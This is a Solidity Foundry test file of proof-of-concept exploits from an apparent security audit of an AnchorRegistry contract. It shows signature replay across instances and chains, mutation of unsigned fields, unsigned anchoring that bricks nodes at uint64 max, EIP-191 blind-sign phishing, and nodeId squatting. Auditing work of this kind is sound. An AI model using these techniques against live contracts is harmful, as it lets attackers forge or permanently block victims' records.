// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

import {AnchorRegistry} from "src/registry/AnchorRegistry.sol";

contract QSR_AccumulatorMock {
    uint64 public leafCount;
}

contract QSR_SnapshotMock {
    address public accumulator;
    address public anchorRegistry;

    constructor(address accumulator_, address anchorRegistry_) {
        accumulator = accumulator_;
        anchorRegistry = anchorRegistry_;
    }
}

/// @notice signature-replay-analysis PoCs against the legacy lane-2 ingress
///         `src/registry/AnchorRegistry.sol` (deployed by
///         `script/DeployNostrWorkspaceInstance.s.sol` and `script/DeployHypercertsInstance.s.sol`).
contract QuillSigReplay_AnchorRegistryTest is Test {
    uint256 internal constant OWNER_KEY = 0xB0B;
    address internal owner;
    address internal admin = address(0xA11CE);

    AnchorRegistry internal regA;
    AnchorRegistry internal regB;

    function _deploy() internal returns (AnchorRegistry reg) {
        reg = new AnchorRegistry(admin, 200_000);
        QSR_AccumulatorMock lane1 = new QSR_AccumulatorMock();
        QSR_SnapshotMock snap = new QSR_SnapshotMock(address(lane1), address(reg));
        reg.bindSnapshot(address(snap));
        // NOTE: read the role id BEFORE the prank — an external getter consumes it.
        bytes32 anchorerRole = reg.ANCHORER_ROLE();
        vm.prank(admin);
        reg.grantRole(anchorerRole, address(this));
    }

    function setUp() public {
        owner = vm.addr(OWNER_KEY);
        regA = _deploy();
        regB = _deploy();
        vm.prank(owner);
        regA.register();
        vm.prank(owner);
        regB.register();
    }

    /// @dev The ENTIRE signed payload: no chainId, no registry address, no nodeId,
    ///      no envelopeKind, no dataCommitment, no deadline.
    function _sign(bytes32 head, uint64 count) internal view returns (bytes memory) {
        bytes32 payload = keccak256(abi.encode(regA.HEAD_DOMAIN_TAG(), head, count));
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(OWNER_KEY, MessageHashUtils.toEthSignedMessageHash(payload));
        return abi.encodePacked(r, s, v);
    }

    // ---------------------------------------------------------------------
    // 1. Cross-instance replay: one signature, two independent registries.
    // ---------------------------------------------------------------------
    function test_headSignature_replays_into_a_second_instance() public {
        bytes32 nodeId = keccak256(abi.encode(owner));
        bytes32 head = keccak256("owner-head-at-count-9");
        bytes memory sig = _sign(head, 9);

        regA.anchor(nodeId, 0, head, 9, keccak256("cid-a"), sig);
        assertEq(regA.lastCount(nodeId), 9);

        // The SAME bytes are accepted by a completely unrelated instance.
        regB.anchor(nodeId, 0, head, 9, keccak256("cid-a"), sig);
        assertEq(regB.lastCount(nodeId), 9);

        // And the victim's own instance-B history is now unreachable below 9: the
        // owner's genuine B-side heads at counts 1..9 are permanently rejected.
        bytes memory sig3 = _sign(keccak256("b-head-3"), 3);
        vm.expectRevert(abi.encodeWithSelector(AnchorRegistry.StaleHeadCount.selector, nodeId, uint64(3), uint64(9)));
        regB.anchor(nodeId, 0, keccak256("b-head-3"), 3, keccak256("cid-b"), sig3);
    }

    // ---------------------------------------------------------------------
    // 2. Cross-chain replay: the payload has no chainId anywhere.
    // ---------------------------------------------------------------------
    function test_headSignature_replays_after_a_chain_id_change() public {
        bytes32 nodeId = keccak256(abi.encode(owner));
        bytes32 head = keccak256("head-1");
        bytes memory sig = _sign(head, 1);

        vm.chainId(1);
        regA.anchor(nodeId, 0, head, 1, keccak256("cid"), sig);

        // Fork / second deployment on another chain: identical bytes still verify.
        vm.chainId(999);
        regB.anchor(nodeId, 0, head, 1, keccak256("cid"), sig);
        assertEq(regB.lastCount(nodeId), 1);
    }

    // ---------------------------------------------------------------------
    // 3. The signature does not cover envelopeKind or dataCommitment, and the
    //    count is consumed anyway: a relayer replays the owner's own signature
    //    with mutated unsigned fields and burns the count.
    // ---------------------------------------------------------------------
    function test_unsignedFields_are_mutable_and_burn_the_count() public {
        bytes32 nodeId = keccak256(abi.encode(owner));
        bytes32 head = keccak256("honest-head-at-7");
        bytes32 honestCommitment = keccak256("honest-availability-pointer");
        bytes memory sig = _sign(head, 7);

        // Relayer submits the owner's real (head, count) with a different envelopeKind
        // and a garbage data commitment. The signature still verifies.
        regA.anchor(nodeId, 1, head, 7, keccak256("garbage"), sig);
        assertEq(regA.lastCount(nodeId), 7);

        // The honest anchor of the SAME head at the SAME count can now never land.
        vm.expectRevert(abi.encodeWithSelector(AnchorRegistry.StaleHeadCount.selector, nodeId, uint64(7), uint64(7)));
        regA.anchor(nodeId, 0, head, 7, honestCommitment, sig);
    }

    // ---------------------------------------------------------------------
    // 4. Non-address node kinds are anchored with NO signature check at all, so
    //    any ANCHORER can set the count to uint64 max and brick the node forever.
    // ---------------------------------------------------------------------
    function test_nonAddressKind_needs_no_signature_and_can_be_bricked() public {
        bytes32 didNode = keccak256("did:plc:victim");
        vm.prank(admin);
        regA.registerNode(didNode, 1);

        // Empty signature. Not an owner. Accepted.
        regA.anchor(didNode, 1, keccak256("forged-head"), type(uint64).max, keccak256("x"), "");
        assertEq(regA.lastCount(didNode), type(uint64).max);

        // Every future anchor for this node reverts, permanently. No admin reset exists.
        vm.expectRevert(
            abi.encodeWithSelector(
                AnchorRegistry.StaleHeadCount.selector, didNode, type(uint64).max, type(uint64).max
            )
        );
        regA.anchor(didNode, 1, keccak256("real-head"), type(uint64).max, keccak256("y"), "");
    }

    // ---------------------------------------------------------------------
    // 5. EIP-191 blind-sign shape: any 32-byte "challenge" a victim signs on an
    //    unrelated site is a valid head authorization. Demonstrated by signing the
    //    raw payload with no protocol context whatsoever.
    // ---------------------------------------------------------------------
    function test_a_blind_32_byte_personal_sign_is_a_valid_head_authorization() public {
        bytes32 nodeId = keccak256(abi.encode(owner));
        // An attacker picks head/count, computes the 32-byte "login nonce", and gets the
        // victim to personal_sign it on any unrelated dapp.
        bytes32 attackerHead = keccak256("attacker-chosen-head");
        uint64 attackerCount = type(uint64).max;
        bytes32 challenge = keccak256(abi.encode(regA.HEAD_DOMAIN_TAG(), attackerHead, attackerCount));

        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(OWNER_KEY, MessageHashUtils.toEthSignedMessageHash(challenge));
        bytes memory sig = abi.encodePacked(r, s, v);

        regA.anchor(nodeId, 0, attackerHead, attackerCount, keccak256("x"), sig);
        assertEq(regA.lastCount(nodeId), type(uint64).max);
    }

    // ---------------------------------------------------------------------
    // 6. A REGISTRAR can pre-empt an address's nodeId under a non-address kind,
    //    which both blocks the victim's self-registration and removes the
    //    co-signature requirement for that identity entirely.
    // ---------------------------------------------------------------------
    function test_registrar_can_squat_an_address_nodeId_and_bypass_the_cosignature() public {
        address victim = vm.addr(0xC0FFEE);
        bytes32 victimNode = keccak256(abi.encode(victim));

        // regB is untouched for this address so far.
        vm.prank(admin);
        regB.registerNode(victimNode, 1); // kind != 0 is all that is checked

        // The victim can never self-register (and so never gets an `ownerOf` entry).
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(AnchorRegistry.AlreadyRegistered.selector, victimNode));
        regB.register();

        // And the anchorer now writes that identity's heads with no signature at all.
        regB.anchor(victimNode, 0, keccak256("forged"), 42, keccak256("z"), "");
        assertEq(regB.lastCount(victimNode), 42);
        assertEq(regB.ownerOf(victimNode), address(0));
    }
}
